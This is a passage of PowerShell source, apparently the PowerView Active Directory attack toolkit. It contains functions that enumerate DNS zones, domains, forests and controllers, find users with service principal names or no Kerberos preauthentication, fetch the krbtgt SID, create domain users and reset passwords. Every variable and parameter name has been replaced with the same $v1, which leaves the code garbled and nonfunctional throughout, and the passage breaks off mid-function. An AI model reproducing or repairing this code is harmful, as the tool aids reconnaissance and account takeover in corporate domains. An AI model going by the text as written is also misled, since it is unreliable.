        elseif ($v1 -eq 6) {

            $v1 = $([System.Convert]::ToBase64String($v1[24..$v1.length]))
            $v1 | Add-Member Noteproperty 'RecordType' 'SOA'
        }

        elseif ($v1 -eq 12) {
            $v1 = Get-Name $v1[24..$v1.length]
            $v1 = $v1
            $v1 | Add-Member Noteproperty 'RecordType' 'PTR'
        }

        elseif ($v1 -eq 13) {

            $v1 = $([System.Convert]::ToBase64String($v1[24..$v1.length]))
            $v1 | Add-Member Noteproperty 'RecordType' 'HINFO'
        }

        elseif ($v1 -eq 15) {

            $v1 = $([System.Convert]::ToBase64String($v1[24..$v1.length]))
            $v1 | Add-Member Noteproperty 'RecordType' 'MX'
        }

        elseif ($v1 -eq 16) {
            [string]$v1  = ''
            [int]$v1 = $v1[24]
            $v1 = 25

            while ($v1-- -gt 0) {
                $v1 += [char]$v1[$v1++]
            }

            $v1 = $v1
            $v1 | Add-Member Noteproperty 'RecordType' 'TXT'
        }

        elseif ($v1 -eq 28) {

            $v1 = $([System.Convert]::ToBase64String($v1[24..$v1.length]))
            $v1 | Add-Member Noteproperty 'RecordType' 'AAAA'
        }

        elseif ($v1 -eq 33) {

            $v1 = $([System.Convert]::ToBase64String($v1[24..$v1.length]))
            $v1 | Add-Member Noteproperty 'RecordType' 'SRV'
        }

        else {
            $v1 = $([System.Convert]::ToBase64String($v1[24..$v1.length]))
            $v1 | Add-Member Noteproperty 'RecordType' 'UNKNOWN'
        }

        $v1 | Add-Member Noteproperty 'UpdatedAtSerial' $v1
        $v1 | Add-Member Noteproperty 'TTL' $v1
        $v1 | Add-Member Noteproperty 'Age' $v1
        $v1 | Add-Member Noteproperty 'TimeStamp' $v1
        $v1 | Add-Member Noteproperty 'Data' $v1
        $v1
    }
}


function Get-DomainDNSZone {

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.DNSZone')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $v1)]
        [ValidateNotNullOrEmpty()]
        [String]
        $v1,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $v1,

        [ValidateNotNullOrEmpty()]
        [String[]]
        $v1,

        [ValidateRange(1, 10000)]
        [Int]
        $v1 = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $v1,

        [Alias('ReturnOne')]
        [Switch]
        $v1,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $v1 = [Management.Automation.PSCredential]::Empty
    )

    PROCESS {
        $v1 = @{
            'LDAPFilter' = '(objectClass=dnsZone)'
        }
        if ($v1['Domain']) { $v1['Domain'] = $v1 }
        if ($v1['Server']) { $v1['Server'] = $v1 }
        if ($v1['Properties']) { $v1['Properties'] = $v1 }
        if ($v1['ResultPageSize']) { $v1['ResultPageSize'] = $v1 }
        if ($v1['ServerTimeLimit']) { $v1['ServerTimeLimit'] = $v1 }
        if ($v1['Credential']) { $v1['Credential'] = $v1 }
        $v1 = Get-DomainSearcher @SearcherArguments

        if ($v1) {
            if ($v1['FindOne']) { $v1 = $v1.FindOne()  }
            else { $v1 = $v1.FindAll() }
            $v1 | Where-Object {$v1} | ForEach-Object {
                $v1 = Convert-LDAPProperty -Properties $v1.Properties
                $v1 | Add-Member NoteProperty 'ZoneName' $v1.name
                $v1.PSObject.TypeNames.Insert(0, 'PowerView.DNSZone')
                $v1
            }

            if ($v1) {
                try { $v1.dispose() }
                catch {
                    Write-Verbose "[Get-DomainDFSShare] Error disposing of the Results object: $v1"
                }
            }
            $v1.dispose()
        }

        $v1['SearchBasePrefix'] = 'CN=MicrosoftDNS,DC=DomainDnsZones'
        $v1 = Get-DomainSearcher @SearcherArguments

        if ($v1) {
            try {
                if ($v1['FindOne']) { $v1 = $v1.FindOne() }
                else { $v1 = $v1.FindAll() }
                $v1 | Where-Object {$v1} | ForEach-Object {
                    $v1 = Convert-LDAPProperty -Properties $v1.Properties
                    $v1 | Add-Member NoteProperty 'ZoneName' $v1.name
                    $v1.PSObject.TypeNames.Insert(0, 'PowerView.DNSZone')
                    $v1
                }
                if ($v1) {
                    try { $v1.dispose() }
                    catch {
                        Write-Verbose "[Get-DomainDNSZone] Error disposing of the Results object: $v1"
                    }
                }
            }
            catch {
                Write-Verbose "[Get-DomainDNSZone] Error accessing 'CN=MicrosoftDNS,DC=DomainDnsZones'"
            }
            $v1.dispose()
        }
    }
}


function Get-DomainDNSRecord {

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.DNSRecord')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0,  Mandatory = $v1, ValueFromPipeline = $v1, ValueFromPipelineByPropertyName = $v1)]
        [ValidateNotNullOrEmpty()]
        [String]
        $v1,

        [ValidateNotNullOrEmpty()]
        [String]
        $v1,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $v1,

        [ValidateNotNullOrEmpty()]
        [String[]]
        $v1 = 'name,distinguishedname,dnsrecord,whencreated,whenchanged',

        [ValidateRange(1, 10000)]
        [Int]
        $v1 = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $v1,

        [Alias('ReturnOne')]
        [Switch]
        $v1,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $v1 = [Management.Automation.PSCredential]::Empty
    )

    PROCESS {
        $v1 = @{
            'LDAPFilter' = '(objectClass=dnsNode)'
            'SearchBasePrefix' = "DC=$($v1),CN=MicrosoftDNS,DC=DomainDnsZones"
        }
        if ($v1['Domain']) { $v1['Domain'] = $v1 }
        if ($v1['Server']) { $v1['Server'] = $v1 }
        if ($v1['Properties']) { $v1['Properties'] = $v1 }
        if ($v1['ResultPageSize']) { $v1['ResultPageSize'] = $v1 }
        if ($v1['ServerTimeLimit']) { $v1['ServerTimeLimit'] = $v1 }
        if ($v1['Credential']) { $v1['Credential'] = $v1 }
        $v1 = Get-DomainSearcher @SearcherArguments

        if ($v1) {
            if ($v1['FindOne']) { $v1 = $v1.FindOne() }
            else { $v1 = $v1.FindAll() }
            $v1 | Where-Object {$v1} | ForEach-Object {
                try {
                    $v1 = Convert-LDAPProperty -Properties $v1.Properties | Select-Object name,distinguishedname,dnsrecord,whencreated,whenchanged
                    $v1 | Add-Member NoteProperty 'ZoneName' $v1


                    if ($v1.dnsrecord -is [System.DirectoryServices.ResultPropertyValueCollection]) {

                        $v1 = Convert-DNSRecord -DNSRecord $v1.dnsrecord[0]
                    }
                    else {
                        $v1 = Convert-DNSRecord -DNSRecord $v1.dnsrecord
                    }

                    if ($v1) {
                        $v1.PSObject.Properties | ForEach-Object {
                            $v1 | Add-Member NoteProperty $v1.Name $v1.Value
                        }
                    }

                    $v1.PSObject.TypeNames.Insert(0, 'PowerView.DNSRecord')
                    $v1
                }
                catch {
                    Write-Warning "[Get-DomainDNSRecord] Error: $v1"
                    $v1
                }
            }

            if ($v1) {
                try { $v1.dispose() }
                catch {
                    Write-Verbose "[Get-DomainDNSRecord] Error disposing of the Results object: $v1"
                }
            }
            $v1.dispose()
        }
    }
}


function Get-Domain {

    [OutputType([System.DirectoryServices.ActiveDirectory.Domain])]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $v1)]
        [ValidateNotNullOrEmpty()]
        [String]
        $v1,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $v1 = [Management.Automation.PSCredential]::Empty
    )

    PROCESS {
        if ($v1['Credential']) {

            Write-Verbose '[Get-Domain] Using alternate credentials for Get-Domain'

            if ($v1['Domain']) {
                $v1 = $v1
            }
            else {

                $v1 = $v1.GetNetworkCredential().Domain
                Write-Verbose "[Get-Domain] Extracted domain '$v1' from -Credential"
            }

            $v1 = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext('Domain', $v1, $v1.UserName, $v1.GetNetworkCredential().Password)

            try {
                [System.DirectoryServices.ActiveDirectory.Domain]::GetDomain($v1)
            }
            catch {
                Write-Verbose "[Get-Domain] The specified domain '$v1' does not exist, could not be contacted, there isn't an existing trust, or the specified credentials are invalid: $v1"
            }
        }
        elseif ($v1['Domain']) {
            $v1 = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext('Domain', $v1)
            try {
                [System.DirectoryServices.ActiveDirectory.Domain]::GetDomain($v1)
            }
            catch {
                Write-Verbose "[Get-Domain] The specified domain '$v1' does not exist, could not be contacted, or there isn't an existing trust : $v1"
            }
        }
        else {
            try {
                [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
            }
            catch {
                Write-Verbose "[Get-Domain] Error retrieving the current domain: $v1"
            }
        }
    }
}


function Get-DomainController {

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.Computer')]
    [OutputType('System.DirectoryServices.ActiveDirectory.DomainController')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $v1)]
        [String]
        $v1,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $v1,

        [Switch]
        $v1,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $v1 = [Management.Automation.PSCredential]::Empty
    )

    PROCESS {
        $v1 = @{}
        if ($v1['Domain']) { $v1['Domain'] = $v1 }
        if ($v1['Credential']) { $v1['Credential'] = $v1 }

        if ($v1['LDAP'] -or $v1['Server']) {
            if ($v1['Server']) { $v1['Server'] = $v1 }


            $v1['LDAPFilter'] = '(userAccountControl:1.2.840.113556.1.4.803:=8192)'

            Get-DomainComputer @Arguments
        }
        else {
            $v1 = Get-Domain @Arguments
            if ($v1) {
                $v1.DomainControllers
            }
        }
    }
}


function Get-Forest {

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('System.Management.Automation.PSCustomObject')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $v1)]
        [ValidateNotNullOrEmpty()]
        [String]
        $v1,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $v1 = [Management.Automation.PSCredential]::Empty
    )

    PROCESS {
        if ($v1['Credential']) {

            Write-Verbose "[Get-Forest] Using alternate credentials for Get-Forest"

            if ($v1['Forest']) {
                $v1 = $v1
            }
            else {

                $v1 = $v1.GetNetworkCredential().Domain
                Write-Verbose "[Get-Forest] Extracted domain '$v1' from -Credential"
            }

            $v1 = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext('Forest', $v1, $v1.UserName, $v1.GetNetworkCredential().Password)

            try {
                $v1 = [System.DirectoryServices.ActiveDirectory.Forest]::GetForest($v1)
            }
            catch {
                Write-Verbose "[Get-Forest] The specified forest '$v1' does not exist, could not be contacted, there isn't an existing trust, or the specified credentials are invalid: $v1"
                $v1
            }
        }
        elseif ($v1['Forest']) {
            $v1 = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext('Forest', $v1)
            try {
                $v1 = [System.DirectoryServices.ActiveDirectory.Forest]::GetForest($v1)
            }
            catch {
                Write-Verbose "[Get-Forest] The specified forest '$v1' does not exist, could not be contacted, or there isn't an existing trust: $v1"
                return $v1
            }
        }
        else {

            $v1 = [System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest()
        }

        if ($v1) {

            if ($v1['Credential']) {
                $v1 = (Get-DomainUser -Identity "krbtgt" -Domain $v1.RootDomain.Name -Credential $v1).objectsid
            }
            else {
                $v1 = (Get-DomainUser -Identity "krbtgt" -Domain $v1.RootDomain.Name).objectsid
            }

            $v1 = $v1 -Split '-'
            $v1 = $v1[0..$($v1.length-2)] -join '-'
            $v1 | Add-Member NoteProperty 'RootDomainSid' $v1
            $v1
        }
    }
}


function Get-ForestDomain {

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('System.DirectoryServices.ActiveDirectory.Domain')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $v1)]
        [ValidateNotNullOrEmpty()]
        [String]
        $v1,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $v1 = [Management.Automation.PSCredential]::Empty
    )

    PROCESS {
        $v1 = @{}
        if ($v1['Forest']) { $v1['Forest'] = $v1 }
        if ($v1['Credential']) { $v1['Credential'] = $v1 }

        $v1 = Get-Forest @Arguments
        if ($v1) {
            $v1.Domains
        }
    }
}


function Get-ForestGlobalCatalog {

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('System.DirectoryServices.ActiveDirectory.GlobalCatalog')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $v1)]
        [ValidateNotNullOrEmpty()]
        [String]
        $v1,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $v1 = [Management.Automation.PSCredential]::Empty
    )

    PROCESS {
        $v1 = @{}
        if ($v1['Forest']) { $v1['Forest'] = $v1 }
        if ($v1['Credential']) { $v1['Credential'] = $v1 }

        $v1 = Get-Forest @Arguments

        if ($v1) {
            $v1.FindAllGlobalCatalogs()
        }
    }
}


function Get-ForestSchemaClass {

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType([System.DirectoryServices.ActiveDirectory.ActiveDirectorySchemaClass])]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $v1)]
        [Alias('Class')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $v1,

        [Alias('Name')]
        [ValidateNotNullOrEmpty()]
        [String]
        $v1,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $v1 = [Management.Automation.PSCredential]::Empty
    )

    PROCESS {
        $v1 = @{}
        if ($v1['Forest']) { $v1['Forest'] = $v1 }
        if ($v1['Credential']) { $v1['Credential'] = $v1 }

        $v1 = Get-Forest @Arguments

        if ($v1) {
            if ($v1['ClassName']) {
                ForEach ($v1 in $v1) {
                    $v1.Schema.FindClass($v1)
                }
            }
            else {
                $v1.Schema.FindAllClasses()
            }
        }
    }
}


function Find-DomainObjectPropertyOutlier {

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.PropertyOutlier')]
    [CmdletBinding(DefaultParameterSetName = 'ClassName')]
    Param(
        [Parameter(Position = 0, Mandatory = $v1, ParameterSetName = 'ClassName')]
        [Alias('Class')]
        [ValidateSet('User', 'Group', 'Computer')]
        [String]
        $v1,

        [ValidateNotNullOrEmpty()]
        [String[]]
        $v1,

        [Parameter(ValueFromPipeline = $v1, Mandatory = $v1, ParameterSetName = 'ReferenceObject')]
        [PSCustomObject]
        $v1,

        [ValidateNotNullOrEmpty()]
        [String]
        $v1,

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $v1,

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $v1,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $v1,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $v1 = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $v1 = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $v1,

        [Switch]
        $v1,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $v1 = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        $v1 = @('admincount','accountexpires','badpasswordtime','badpwdcount','cn','codepage','countrycode','description', 'displayname','distinguishedname','dscorepropagationdata','givenname','instancetype','iscriticalsystemobject','lastlogoff','lastlogon','lastlogontimestamp','lockouttime','logoncount','memberof','msds-supportedencryptiontypes','name','objectcategory','objectclass','objectguid','objectsid','primarygroupid','pwdlastset','samaccountname','samaccounttype','sn','useraccountcontrol','userprincipalname','usnchanged','usncreated','whenchanged','whencreated')

        $v1 = @('admincount','cn','description','distinguishedname','dscorepropagationdata','grouptype','instancetype','iscriticalsystemobject','member','memberof','name','objectcategory','objectclass','objectguid','objectsid','samaccountname','samaccounttype','systemflags','usnchanged','usncreated','whenchanged','whencreated')

        $v1 = @('accountexpires','badpasswordtime','badpwdcount','cn','codepage','countrycode','distinguishedname','dnshostname','dscorepropagationdata','instancetype','iscriticalsystemobject','lastlogoff','lastlogon','lastlogontimestamp','localpolicyflags','logoncount','msds-supportedencryptiontypes','name','objectcategory','objectclass','objectguid','objectsid','operatingsystem','operatingsystemservicepack','operatingsystemversion','primarygroupid','pwdlastset','samaccountname','samaccounttype','serviceprincipalname','useraccountcontrol','usnchanged','usncreated','whenchanged','whencreated')

        $v1 = @{}
        if ($v1['Domain']) { $v1['Domain'] = $v1 }
        if ($v1['LDAPFilter']) { $v1['LDAPFilter'] = $v1 }
        if ($v1['SearchBase']) { $v1['SearchBase'] = $v1 }
        if ($v1['Server']) { $v1['Server'] = $v1 }
        if ($v1['SearchScope']) { $v1['SearchScope'] = $v1 }
        if ($v1['ResultPageSize']) { $v1['ResultPageSize'] = $v1 }
        if ($v1['ServerTimeLimit']) { $v1['ServerTimeLimit'] = $v1 }
        if ($v1['Tombstone']) { $v1['Tombstone'] = $v1 }
        if ($v1['Credential']) { $v1['Credential'] = $v1 }


        if ($v1['Domain']) {
            if ($v1['Credential']) {
                $v1 = Get-Domain -Domain $v1 | Select-Object -ExpandProperty Forest | Select-Object -ExpandProperty Name
            }
            else {
                $v1 = Get-Domain -Domain $v1 -Credential $v1 | Select-Object -ExpandProperty Forest | Select-Object -ExpandProperty Name
            }
            Write-Verbose "[Find-DomainObjectPropertyOutlier] Enumerated forest '$v1' for target domain '$v1'"
        }

        $v1 = @{}
        if ($v1['Credential']) { $v1['Credential'] = $v1 }
        if ($v1) {
            $v1['Forest'] = $v1
        }
    }

    PROCESS {

        if ($v1['ReferencePropertySet']) {
            Write-Verbose "[Find-DomainObjectPropertyOutlier] Using specified -ReferencePropertySet"
            $v1 = $v1
        }
        elseif ($v1['ReferenceObject']) {
            Write-Verbose "[Find-DomainObjectPropertyOutlier] Extracting property names from -ReferenceObject to use as the reference property set"
            $v1 = Get-Member -InputObject $v1 -MemberType NoteProperty | Select-Object -Expand Name
            $v1 = $v1.objectclass | Select-Object -Last 1
            Write-Verbose "[Find-DomainObjectPropertyOutlier] Calculated ReferenceObjectClass : $v1"
        }
        else {
            Write-Verbose "[Find-DomainObjectPropertyOutlier] Using the default reference property set for the object class '$v1'"
        }

        if (($v1 -eq 'User') -or ($v1 -eq 'User')) {
            $v1 = Get-DomainUser @SearcherArguments
            if (-not $v1) {
                $v1 = $v1
            }
        }
        elseif (($v1 -eq 'Group') -or ($v1 -eq 'Group')) {
            $v1 = Get-DomainGroup @SearcherArguments
            if (-not $v1) {
                $v1 = $v1
            }
        }
        elseif (($v1 -eq 'Computer') -or ($v1 -eq 'Computer')) {
            $v1 = Get-DomainComputer @SearcherArguments
            if (-not $v1) {
                $v1 = $v1
            }
        }
        else {
            throw "[Find-DomainObjectPropertyOutlier] Invalid class: $v1"
        }

        ForEach ($v1 in $v1) {
            $v1 = Get-Member -InputObject $v1 -MemberType NoteProperty | Select-Object -Expand Name
            ForEach($v1 in $v1) {
                if ($v1 -NotContains $v1) {
                    $v1 = New-Object PSObject
                    $v1 | Add-Member Noteproperty 'SamAccountName' $v1.SamAccountName
                    $v1 | Add-Member Noteproperty 'Property' $v1
                    $v1 | Add-Member Noteproperty 'Value' $v1.$v1
                    $v1.PSObject.TypeNames.Insert(0, 'PowerView.PropertyOutlier')
                    $v1
                }
            }
        }
    }
}








function Get-DomainUser {

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssignments', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.User')]
    [OutputType('PowerView.User.Raw')]
    [CmdletBinding(DefaultParameterSetName = 'AllowDelegation')]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $v1, ValueFromPipelineByPropertyName = $v1)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name', 'MemberDistinguishedName', 'MemberName')]
        [String[]]
        $v1,

        [Switch]
        $v1,

        [Switch]
        $v1,

        [Parameter(ParameterSetName = 'AllowDelegation')]
        [Switch]
        $v1,

        [Parameter(ParameterSetName = 'DisallowDelegation')]
        [Switch]
        $v1,

        [Switch]
        $v1,

        [Alias('KerberosPreauthNotRequired', 'NoPreauth')]
        [Switch]
        $v1,

        [ValidateNotNullOrEmpty()]
        [String]
        $v1,

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $v1,

        [ValidateNotNullOrEmpty()]
        [String[]]
        $v1,

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $v1,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $v1,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $v1 = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $v1 = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $v1,

        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        $v1,

        [Switch]
        $v1,

        [Alias('ReturnOne')]
        [Switch]
        $v1,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $v1 = [Management.Automation.PSCredential]::Empty,

        [Switch]
        $v1
    )

    DynamicParam {
        $v1 = [Enum]::GetNames($v1)

        $v1 = $v1 | ForEach-Object {$v1; "NOT_$v1"}

        New-DynamicParameter -Name UACFilter -ValidateSet $v1 -Type ([array])
    }

    BEGIN {
        $v1 = @{}
        if ($v1['Domain']) { $v1['Domain'] = $v1 }
        if ($v1['Properties']) { $v1['Properties'] = $v1 }
        if ($v1['SearchBase']) { $v1['SearchBase'] = $v1 }
        if ($v1['Server']) { $v1['Server'] = $v1 }
        if ($v1['SearchScope']) { $v1['SearchScope'] = $v1 }
        if ($v1['ResultPageSize']) { $v1['ResultPageSize'] = $v1 }
        if ($v1['ServerTimeLimit']) { $v1['ServerTimeLimit'] = $v1 }
        if ($v1['SecurityMasks']) { $v1['SecurityMasks'] = $v1 }
        if ($v1['Tombstone']) { $v1['Tombstone'] = $v1 }
        if ($v1['Credential']) { $v1['Credential'] = $v1 }
        $v1 = Get-DomainSearcher @SearcherArguments
    }

    PROCESS {

        if ($v1 -and ($v1.Count -ne 0)) {
            New-DynamicParameter -CreateVariables -BoundParameters $v1
        }

        if ($v1) {
            $v1 = ''
            $v1 = ''
            $v1 | Where-Object {$v1} | ForEach-Object {
                $v1 = $v1.Replace('(', '\28').Replace(')', '\29')
                if ($v1 -match '^S-1-') {
                    $v1 += "(objectsid=$v1)"
                }
                elseif ($v1 -match '^CN=') {
                    $v1 += "(distinguishedname=$v1)"
                    if ((-not $v1['Domain']) -and (-not $v1['SearchBase'])) {


                        $v1 = $v1.SubString($v1.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                        Write-Verbose "[Get-DomainUser] Extracted domain '$v1' from '$v1'"
                        $v1['Domain'] = $v1
                        $v1 = Get-DomainSearcher @SearcherArguments
                        if (-not $v1) {
                            Write-Warning "[Get-DomainUser] Unable to retrieve domain searcher for '$v1'"
                        }
                    }
                }
                elseif ($v1 -imatch '^[0-9A-F]{8}-([0-9A-F]{4}-){3}[0-9A-F]{12}$') {
                    $v1 = (([Guid]$v1).ToByteArray() | ForEach-Object { '\' + $v1.ToString('X2') }) -join ''
                    $v1 += "(objectguid=$v1)"
                }
                elseif ($v1.Contains('\')) {
                    $v1 = $v1.Replace('\28', '(').Replace('\29', ')') | Convert-ADName -OutputType Canonical
                    if ($v1) {
                        $v1 = $v1.SubString(0, $v1.IndexOf('/'))
                        $v1 = $v1.Split('\')[1]
                        $v1 += "(samAccountName=$v1)"
                        $v1['Domain'] = $v1
                        Write-Verbose "[Get-DomainUser] Extracted domain '$v1' from '$v1'"
                        $v1 = Get-DomainSearcher @SearcherArguments
                    }
                }
                else {
                    $v1 += "(samAccountName=$v1)"
                }
            }

            if ($v1 -and ($v1.Trim() -ne '') ) {
                $v1 += "(|$v1)"
            }

            if ($v1['SPN']) {
                Write-Verbose '[Get-DomainUser] Searching for non-null service principal names'
                $v1 += '(servicePrincipalName=*)'
            }
            if ($v1['AllowDelegation']) {
                Write-Verbose '[Get-DomainUser] Searching for users who can be delegated'

                $v1 += '(!(userAccountControl:1.2.840.113556.1.4.803:=1048574))'
            }
            if ($v1['DisallowDelegation']) {
                Write-Verbose '[Get-DomainUser] Searching for users who are sensitive and not trusted for delegation'
                $v1 += '(userAccountControl:1.2.840.113556.1.4.803:=1048574)'
            }
            if ($v1['AdminCount']) {
                Write-Verbose '[Get-DomainUser] Searching for adminCount=1'
                $v1 += '(admincount=1)'
            }
            if ($v1['TrustedToAuth']) {
                Write-Verbose '[Get-DomainUser] Searching for users that are trusted to authenticate for other principals'
                $v1 += '(msds-allowedtodelegateto=*)'
            }
            if ($v1['PreauthNotRequired']) {
                Write-Verbose '[Get-DomainUser] Searching for user accounts that do not require kerberos preauthenticate'
                $v1 += '(userAccountControl:1.2.840.113556.1.4.803:=4194304)'
            }
            if ($v1['LDAPFilter']) {
                Write-Verbose "[Get-DomainUser] Using additional LDAP filter: $v1"
                $v1 += "$v1"
            }


            $v1 | Where-Object {$v1} | ForEach-Object {
                if ($v1 -match 'NOT_.*') {
                    $v1 = $v1.Substring(4)
                    $v1 = [Int]($v1::$v1)
                    $v1 += "(!(userAccountControl:1.2.840.113556.1.4.803:=$v1))"
                }
                else {
                    $v1 = [Int]($v1::$v1)
                    $v1 += "(userAccountControl:1.2.840.113556.1.4.803:=$v1)"
                }
            }

            $v1.filter = "(&(samAccountType=805306368)$v1)"
            Write-Verbose "[Get-DomainUser] filter string: $($v1.filter)"

            if ($v1['FindOne']) { $v1 = $v1.FindOne() }
            else { $v1 = $v1.FindAll() }
            $v1 | Where-Object {$v1} | ForEach-Object {
                if ($v1['Raw']) {

                    $v1 = $v1
                    $v1.PSObject.TypeNames.Insert(0, 'PowerView.User.Raw')
                }
                else {
                    $v1 = Convert-LDAPProperty -Properties $v1.Properties
                    $v1.PSObject.TypeNames.Insert(0, 'PowerView.User')
                }
                $v1
            }
            if ($v1) {
                try { $v1.dispose() }
                catch {
                    Write-Verbose "[Get-DomainUser] Error disposing of the Results object: $v1"
                }
            }
            $v1.dispose()
        }
    }
}


function New-DomainUser {

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseShouldProcessForStateChangingFunctions', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('DirectoryServices.AccountManagement.UserPrincipal')]
    Param(
        [Parameter(Mandatory = $v1)]
        [ValidateLength(0, 256)]
        [String]
        $v1,

        [Parameter(Mandatory = $v1)]
        [ValidateNotNullOrEmpty()]
        [Alias('Password')]
        [Security.SecureString]
        $v1,

        [ValidateNotNullOrEmpty()]
        [String]
        $v1,

        [ValidateNotNullOrEmpty()]
        [String]
        $v1,

        [ValidateNotNullOrEmpty()]
        [String]
        $v1,

        [ValidateNotNullOrEmpty()]
        [String]
        $v1,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $v1 = [Management.Automation.PSCredential]::Empty
    )

    $v1 = @{
        'Identity' = $v1
    }
    if ($v1['Domain']) { $v1['Domain'] = $v1 }
    if ($v1['Credential']) { $v1['Credential'] = $v1 }
    $v1 = Get-PrincipalContext @ContextArguments

    if ($v1) {
        $v1 = New-Object -TypeName System.DirectoryServices.AccountManagement.UserPrincipal -ArgumentList ($v1.Context)


        $v1.SamAccountName = $v1.Identity
        $v1 = New-Object System.Management.Automation.PSCredential('a', $v1)
        $v1.SetPassword($v1.GetNetworkCredential().Password)
        $v1.Enabled = $v1
        $v1.PasswordNotRequired = $v1

        if ($v1['Name']) {
            $v1.Name = $v1
        }
        else {
            $v1.Name = $v1.Identity
        }
        if ($v1['DisplayName']) {
            $v1.DisplayName = $v1
        }
        else {
            $v1.DisplayName = $v1.Identity
        }

        if ($v1['Description']) {
            $v1.Description = $v1
        }

        Write-Verbose "[New-DomainUser] Attempting to create user '$v1'"
        try {
            $v1 = $v1.Save()
            Write-Verbose "[New-DomainUser] User '$v1' successfully created"
            $v1
        }
        catch {
            Write-Warning "[New-DomainUser] Error creating user '$v1' : $v1"
        }
    }
}


function Set-DomainUserPassword {

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseShouldProcessForStateChangingFunctions', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('DirectoryServices.AccountManagement.UserPrincipal')]
    Param(
        [Parameter(Position = 0, Mandatory = $v1)]
        [Alias('UserName', 'UserIdentity', 'User')]
        [String]
        $v1,

        [Parameter(Mandatory = $v1)]
        [ValidateNotNullOrEmpty()]
        [Alias('Password')]
        [Security.SecureString]
        $v1,

        [ValidateNotNullOrEmpty()]
        [String]
        $v1,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $v1 = [Management.Automation.PSCredential]::Empty
    )

    $v1 = @{ 'Identity' = $v1 }
    if ($v1['Domain']) { $v1['Domain'] = $v1 }
    if ($v1['Credential']) { $v1['Credential'] = $v1 }
    $v1 = Get-PrincipalContext @ContextArguments

    if ($v1) {
        $v1 = [System.DirectoryServices.AccountManagement.UserPrincipal]::FindByIdentity($v1.Context, $v1)

        if ($v1) {
            Write-Verbose "[Set-DomainUserPassword] Attempting to set the password for user '$v1'"
            try {
                $v1 = New-Object System.Management.Automation.PSCredential('a', $v1)
                $v1.SetPassword($v1.GetNetworkCredential().Password)

                $v1 = $v1.Save()
